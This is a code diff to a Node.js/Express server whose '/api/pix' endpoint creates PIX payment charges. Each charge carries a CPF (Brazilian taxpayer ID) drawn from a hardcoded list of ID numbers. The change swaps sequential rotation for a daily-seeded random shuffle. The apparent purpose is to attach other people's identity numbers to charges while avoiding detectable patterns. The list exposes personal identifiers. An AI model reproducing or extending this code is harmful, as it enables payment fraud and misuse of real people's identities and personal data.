@@ -7,6 +7,72 @@ const crypto = require('crypto');
 const fs = require("fs");
 
 
+function shuffleArray(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
+}
+
+function getDailySeed() {
+    const today = new Date();
+    const startOfYear = new Date(today.getFullYear(), 0, 0);
+    const diff = today - startOfYear;
+    const oneDay = 1000 * 60 * 60 * 24;
+    return Math.floor(diff / oneDay);
+}
+
+function mulberry32(seed) {
+    return function() {
+        seed |= 0;
+        seed = seed + 0x6D2B79F5 | 0;
+        let t = Math.imul(seed ^ seed >>> 15, 1 | seed);
+        t = t + Math.imul(t ^ t >>> 7, 61 | t) | 0;
+        return ((t ^ t >>> 14) >>> 0) / 4294967296;
+    }
+}
+
+let currentShuffledCpfList = [];
+let currentCpfIndex = 0;
+let lastUsedSeed = -1;
+
+function getShuffledCpfList(seed) {
+    const prng = mulberry32(seed);
+    const array = [...CPF_LIST];
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(prng() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
+}
+
+function getNextCpf() {
+    const currentSeed = getDailySeed();
+
+    if (currentSeed !== lastUsedSeed || currentShuffledCpfList.length === 0) {
+        currentShuffledCpfList = getShuffledCpfList(currentSeed);
+        currentCpfIndex = 0;
+        lastUsedSeed = currentSeed;
+    }
+
+    if (currentCpfIndex >= currentShuffledCpfList.length) {
+        currentCpfIndex = 0;
+    }
+
+    const selectedCpf = currentShuffledCpfList[currentCpfIndex];
+    currentCpfIndex++;
+    return selectedCpf || CPF_LIST[Math.floor(Math.random() * CPF_LIST.length)];
+}
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// ─── Middlewares ───────────────────────────────────────────────────────────────
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
 // ─── Configuração de CPFs (FORMATO SIMPLIFICADO) ───────────────────────────────
 const RAW_CPFS = `
 38359128871
@@ -275,30 +341,6 @@ const RAW_CPFS = `
 
 const CPF_LIST = RAW_CPFS.trim().split(/[\s,]+/).filter(cpf => cpf.length >= 11);
 
-let currentCpfIndex = 0;
-
-/**
- * Retorna o próximo CPF da lista em ordem sequencial.
- * Quando chega ao fim da lista, reinicia do primeiro.
- */
-function getNextCpf() {
-    if (currentCpfIndex >= CPF_LIST.length) {
-        currentCpfIndex = 0;
-    }
-
-    const selectedCpf = CPF_LIST[currentCpfIndex];
-    currentCpfIndex++;
-    return selectedCpf;
-}
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-// ─── Middlewares ───────────────────────────────────────────────────────────────
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
-
 
 /**
  * Formata o valor monetário (ex: 100 -> "1,00")
@@ -390,7 +432,7 @@ app.post('/api/pix', async (req, res) => {
             return res.status(400).json({ success: false, error: 'Campos obrigatórios ausentes.' });
         }
 
-        // Seleciona o próximo CPF na ordem sequencial da lista
+        // Seleciona o próximo CPF único e aleatório
         const selectedCpf = getNextCpf();
         
         // Captura o endereço e CEP da URL do site (enviado pelo frontend)
@@ -457,15 +499,18 @@ app.post('/api/pix', async (req, res) => {
         
         return res.json({
             success: true,
-            qr_code: lastTransaction?.pix_qr_code,
-            qr_code_url: lastTransaction?.pix_qr_code_url,
-            expires_at: lastTransaction?.expires_at,
-            order_id: data.id
+            pixCode: lastTransaction && lastTransaction.qr_code,
+            qrCodeUrl: lastTransaction && lastTransaction.qr_code_url,
+            orderId: data.id,
+            sentEmail: dynamicEmail,
+            sentCpf: selectedCpf,
+            sentAddress: formattedMetadata.endereco_entrega,
+            sentCustomerData: formattedMetadata.dados_cliente
         });
 
-    } catch (error) {
-        console.error('Erro ao gerar PIX:', error);
-        res.status(500).json({ success: false, error: 'Erro interno ao processar o pagamento.' });
+    } catch (err) {
+        console.error('Erro interno:', err);
+        return res.status(500).json({ success: false, error: 'Erro interno' });
     }
 });
 
